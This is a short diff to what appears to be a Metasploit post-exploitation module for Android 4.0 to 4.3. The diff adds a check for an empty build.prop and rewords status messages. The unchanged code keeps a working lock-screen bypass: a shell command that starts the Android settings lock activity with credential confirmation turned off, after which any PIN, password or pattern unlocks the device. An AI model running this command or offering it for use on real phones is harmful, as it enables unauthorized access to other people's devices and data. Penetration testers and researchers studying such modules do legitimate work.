@@ -41,6 +41,12 @@ class Metasploit4 < Msf::Post
 
   def run
     buildprop = cmd_exec('cat /system/build.prop')
+
+    if buildprop.blank?
+      print_error("Blank build.prop, try again")
+      return
+    end
+
     unless buildprop =~ /ro.build.version.release=4.[0|1|2|3]/
       print_error("This module is only compatible with Android versions 4.0 to 4.3")
       return
@@ -48,10 +54,11 @@ class Metasploit4 < Msf::Post
 
     output = cmd_exec('am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task')
     if output =~ /Error:/
-        print_error("The Intent could not be started")
-        vprint_status("Command output: #{output}")
+      print_error("The Intent could not be started")
+      vprint_status("Command output: #{output}")
     else
-        print_good("Intent started, the lock screen should now have been removed")
+      print_good("Intent started, the lock screen should now be a dud.")
+      print_good("Go ahead and manually swipe or provide any pin/password/pattern to continue.")
     end
   end
 
